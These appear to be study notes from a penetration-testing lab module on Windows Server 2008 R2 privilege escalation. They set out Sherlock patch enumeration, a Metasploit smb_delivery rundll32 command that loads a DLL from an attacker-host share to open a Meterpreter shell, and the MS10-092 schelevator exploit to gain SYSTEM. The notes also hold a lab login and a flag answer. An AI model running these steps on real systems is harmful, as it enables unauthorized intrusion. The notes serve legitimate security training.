# Windows Privilege Escalation — Section 29: Windows Server

## ID
531

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 29 — Windows Server (Legacy Privesc)

## Description
Demonstrates privilege escalation on a Windows Server 2008 R2 host using Sherlock enumeration, Metasploit smb_delivery for initial shell, and the MS10-092 Task Scheduler XML exploit (schelevator) to achieve SYSTEM.

## Tags
windows-server-2008, privesc, sherlock, metasploit, ms10-092, legacy-os

## Commands
- `wmic qfe`
- `Set-ExecutionPolicy bypass -Scope process`
- `Import-Module .\Sherlock.ps1`
- `Find-AllVulns`
- `use exploit/windows/smb/smb_delivery`
- `rundll32.exe \\<ATTACKER_IP>\<SHARE>\test.dll,0`
- `use exploit/windows/local/ms10_092_schelevator`
- `migrate <PID>`

## What This Section Covers
Attacking end-of-life Windows Server 2008 R2 systems that lack modern security features like Credential Guard, Device Guard, and Windows Defender ATP. The workflow chains Sherlock-based vulnerability enumeration with Metasploit exploitation to escalate from a standard user to NT AUTHORITY\SYSTEM via a missing kernel patch.

## Methodology
1. RDP into the target as `htb-student` using `rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' <TARGET_IP>`
2. Open CMD and enumerate installed hotfixes with `wmic qfe` — note how far behind patching is
3. Open PowerShell, set execution policy to bypass: `Set-ExecutionPolicy bypass -Scope process`
4. Navigate to `C:\Tools`, import Sherlock, and run `Find-AllVulns` to identify missing patches
5. On attacker box, start Metasploit and configure `exploit/windows/smb/smb_delivery` with `set LHOST <ATTACKER_IP>`, `set SRVHOST <ATTACKER_IP>`, target set to `0` (DLL), then `exploit`
6. Copy the generated `rundll32.exe` command and run it in CMD on the target to get a Meterpreter session
7. In Meterpreter, run `ps` to find a 64-bit process (e.g. `conhost.exe`), then `migrate <PID>` — the exploit will fail if you stay in a 32-bit process
8. Background the session with `bg`
9. Load the privesc module: `use exploit/windows/local/ms10_092_schelevator`
10. Set options: `set SESSION 1`, `set LHOST <ATTACKER_IP>`, `set LPORT 4443`, then `exploit`
11. Receive elevated Meterpreter shell as `NT AUTHORITY\SYSTEM`
12. Drop into a shell with `shell` and read the flag: `type C:\Users\Administrator\Desktop\flag.txt`

## Multi-step Workflow — Attacker Side (Metasploit)
```
sudo msfconsole -q
use exploit/windows/smb/smb_delivery
set LHOST <ATTACKER_IP>
set SRVHOST <ATTACKER_IP>
set target 0
exploit
# Copy the rundll32 command → paste in target CMD
# Wait for session callback
sessions -i 1
ps
migrate <64BIT_PID>
bg
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST <ATTACKER_IP>
set LPORT 4443
exploit
shell
type C:\Users\Administrator\Desktop\flag.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — flag.txt on Administrator Desktop | L3gacy_st1ill_pr3valent! | MS10-092 schelevator → SYSTEM shell → `type C:\Users\Administrator\Desktop\flag.txt` |

## Key Takeaways
- Server 2008 R2 lacks Credential Guard, Device Guard, AppLocker (full), and Windows Defender ATP — basically wide open compared to Server 2016+
- `wmic qfe` is the fastest way to check patch level; a single old KB tells you the system is years behind
- Sherlock identifies three "Appears Vulnerable" results on this box: MS10-092, MS15-051, MS16-032 — any could work
- You **must migrate to a 64-bit process** before running the schelevator exploit or it will fail silently
- `smb_delivery` is a clean way to get a Meterpreter shell when you have CMD/RDP access — generates a one-liner `rundll32` command
- In real engagements, context matters: a Server 2008 box in a medical environment running MRI software can't just be decommissioned — recommend mitigating controls like network segmentation

## Gotchas
- If `xfreerdp` gives errors on Pwnbox, use `rdesktop` instead — the module explicitly notes this
- The initial Meterpreter shell from `smb_delivery` with target `0` (DLL) lands as x86 — you must migrate to an x64 process before running local exploits
- Don't forget to set a different `LPORT` for the privesc module (e.g. 4443) since 4444 is already in use by the initial handler
